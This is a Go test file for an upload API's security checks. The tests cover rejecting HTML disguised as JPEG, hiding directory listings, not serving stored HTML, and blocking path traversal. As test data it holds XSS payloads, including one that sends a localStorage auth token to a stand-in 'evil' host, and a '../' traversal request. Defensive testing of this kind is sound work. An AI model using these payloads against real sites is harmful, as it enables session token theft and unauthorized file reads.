package httpapi

import (
	"bytes"
	"encoding/json"
	"io"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/eklier101/apexdrive/internal/config"
	"github.com/eklier101/apexdrive/internal/db"
)

var jpegBytes = []byte{
	0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01,
	0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xff, 0xd9,
}

func testRouter(t *testing.T) (http.Handler, *config.Config) {
	t.Helper()
	dir := t.TempDir()
	cfg := &config.Config{
		JWTSecret:  "test-secret",
		UploadsDir: filepath.Join(dir, "uploads"),
		APKsDir:    filepath.Join(dir, "apks"),
		PublicDir:  filepath.Join(dir, "public"),
		DBPath:     filepath.Join(dir, "test.db"),
	}
	if err := os.MkdirAll(cfg.UploadsDir, 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(cfg.APKsDir, 0755); err != nil {
		t.Fatal(err)
	}
	database, err := db.Open(cfg.DBPath)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = database.Close() })
	return NewRouter(cfg, database), cfg
}

func multipartFile(t *testing.T, filename string, content []byte) (*bytes.Buffer, string) {
	t.Helper()
	var buf bytes.Buffer
	w := multipart.NewWriter(&buf)
	part, err := w.CreateFormFile("file", filename)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := part.Write(content); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return &buf, w.FormDataContentType()
}

func TestUploadRejectsHTML(t *testing.T) {
	h, _ := testRouter(t)
	body, ctype := multipartFile(t, "steal.html", []byte("<script>alert(1)</script>"))
	req := httptest.NewRequest(http.MethodPost, "/api/upload", body)
	req.Header.Set("Content-Type", ctype)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.Bytes())
	}
	if !strings.Contains(rec.Body.String(), "Only JPEG, PNG, GIF, and WebP") {
		t.Fatalf("unexpected error: %s", rec.Body.String())
	}
}

func TestUploadRejectsHTMLDisguisedAsJPEG(t *testing.T) {
	h, _ := testRouter(t)
	body, ctype := multipartFile(t, "receipt.jpg", []byte("<!DOCTYPE html><script>document.location='https://evil/'+localStorage.vt_auth_token</script>"))
	req := httptest.NewRequest(http.MethodPost, "/api/upload", body)
	req.Header.Set("Content-Type", ctype)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.Bytes())
	}
}

func TestUploadAcceptsJPEG(t *testing.T) {
	h, _ := testRouter(t)
	body, ctype := multipartFile(t, "receipt.jpg", jpegBytes)
	req := httptest.NewRequest(http.MethodPost, "/api/upload", body)
	req.Header.Set("Content-Type", ctype)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.Bytes())
	}
	var out map[string]any
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatal(err)
	}
	url, _ := out["url"].(string)
	if !strings.HasPrefix(url, "/uploads/") || !strings.HasSuffix(url, ".jpg") {
		t.Fatalf("url = %q", url)
	}
	get := httptest.NewRequest(http.MethodGet, url, nil)
	got := httptest.NewRecorder()
	h.ServeHTTP(got, get)
	if got.Code != http.StatusOK {
		t.Fatalf("GET uploaded image status = %d", got.Code)
	}
	if !bytes.Equal(got.Body.Bytes(), jpegBytes) {
		t.Fatal("served bytes do not match uploaded JPEG")
	}
}

func TestUploadsDirectoryIsNotListed(t *testing.T) {
	h, cfg := testRouter(t)
	if err := os.WriteFile(filepath.Join(cfg.UploadsDir, "img_1_secret.jpg"), jpegBytes, 0644); err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodGet, "/uploads/", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code == http.StatusOK && bytes.Contains(rec.Body.Bytes(), []byte("img_1_secret.jpg")) {
		t.Fatalf("directory listing exposed uploads: %s", rec.Body.String())
	}
	if rec.Code == http.StatusOK && rec.Header().Get("Content-Type") == "text/html; charset=utf-8" {
		t.Fatal("uploads root returned an HTML directory listing")
	}
}

func TestExistingHTMLUploadIsNotServed(t *testing.T) {
	h, cfg := testRouter(t)
	if err := os.WriteFile(filepath.Join(cfg.UploadsDir, "img_old_xss.html"), []byte("<script>steal()</script>"), 0644); err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodGet, "/uploads/img_old_xss.html", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status = %d, body = %s", rec.Code, rec.Body.Bytes())
	}
	if bytes.Contains(rec.Body.Bytes(), []byte("<script>")) {
		t.Fatal("HTML payload was served")
	}
}

func TestServeUploadRejectsPathTraversal(t *testing.T) {
	h, cfg := testRouter(t)
	outside := filepath.Join(filepath.Dir(cfg.UploadsDir), "secret.html")
	if err := os.WriteFile(outside, []byte("<html>nope</html>"), 0644); err != nil {
		t.Fatal(err)
	}
	req := httptest.NewRequest(http.MethodGet, "/uploads/../secret.html", nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	body, _ := io.ReadAll(rec.Result().Body)
	if bytes.Contains(body, []byte("nope")) {
		t.Fatal("path traversal served a file outside uploads")
	}
}
